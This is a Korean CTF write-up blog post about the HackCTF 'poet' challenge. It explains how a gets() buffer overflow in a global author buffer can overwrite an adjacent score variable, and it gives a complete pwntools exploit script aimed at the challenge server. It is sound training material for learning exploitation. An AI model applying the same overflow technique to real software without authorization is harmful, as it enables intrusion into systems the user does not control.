---
layout: post
title:  "HackCTF poet write-up"
date:   2020-01-10 19:45:55
image:  hackctf_poet.PNG
tags:   [HackCTF]
categories: [Write-up]
---


### 1.  문제

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20poet/Untitled.png)  
NX 비트가 걸려있다.  따라서 메모리 영역의 쓰기 권한이 없다
<br>
 
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20poet/Untitled%201.png)  
프로그램을 실행시키면 다음과 같은 문구가 나온다  
<br>
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20poet/Untitled%202.png)  
멀 입력하라고 나온다. 문제로 봤을때 1000000점을 획득해야 되는 것 같다
- **main**  
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20poet/Untitled%203.png)

- **get_poem**  
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20poet/Untitled%204.png)

<br>
메인 함수를 보면 while문 안에 get_poem(), get_author(), rate_poem() 함수가 있다.  
<br><br>
get_poem 함수에서 처음 입력을 받게 되고, poem 이라는 변수에 저장을 하게 된다. poem 변수는 전역변수인 듯 하다


- **rate_poem()**  
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20poet/Untitled%205.png)

- **<et_author**  
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20poet/Untitled%206.png)


get_author 함수에서 두번째로 입력을 받는다. unk_6024A0 이라는 변수에 입력을 받는데, 이역시 전역변수이다

rate_poem() 함수에서 점수를 계산하는 로직이 존재하는데, 일정 조건에 맞아야지 dwor_6024E0 이라는 변수에 100씩 저장하게 된다. 이 변수 역시 전역 변수이고 메인문에서 1,000,000 와 비교하는 비교대상이다.

따라서 dwor_6024E0  변수 값을 알맞게 조정해주면 될 것이다. 그래야 while을 탈출하여 reward 함수가 실행되게 될것이고 그곳에서 flag를 확인 가능하다  

<br><br>

### 2. 접근방법

느낌상 해당 조건문에 맞게 하나씩 값을 노가다로 넣는 것을 아닐 것이고, gets 함수의 bof를 이용하여 조건에 맞게 수정해주면된다

- 필요 값들
    1. **dwor_6024E0**  : 비교 대상  
        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20poet/Untitled%207.png)

    2. **unk_6024A0 :** 입력한 값이 들어가는 곳  
        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20poet/Untitled%208.png)
        
<br>
따라서 unk_6024A0에서 bof를 이용하여  dwor_6024E0 값을 변경하면 된다  
두 주소의 차이는 64이기때문에, "A"*64+1,000,000 이렇게 입력해주면 되는 간단한 문제이다
<br><br><br><br>


### 3. 풀이

최종 익스 코드는 다음과 같다
```python
from pwn import *

p = remote("ctf.j0n9hyun.xyz",3012)
#p = process("./poet")
#gdb.attach(p)

p.recvuntil("> ")

payload = "A"*10

p.sendline(payload)

p.recvuntil("> ")

payload2 = "B"*64
payload2 += p64(1000000)

p.sendline(payload2)

p.interactive()
```

<br><br><br>
### 4. 몰랐던 개념

처음에 strcpy 함수가 보여서 이를 이용하려고 했으나, 복사하려는 값의 배열크기가 충분하지 않아서 실패하였다. 문제와 변수 크기 이런것을 주의깊게 보면서 풀어야 할 것 같다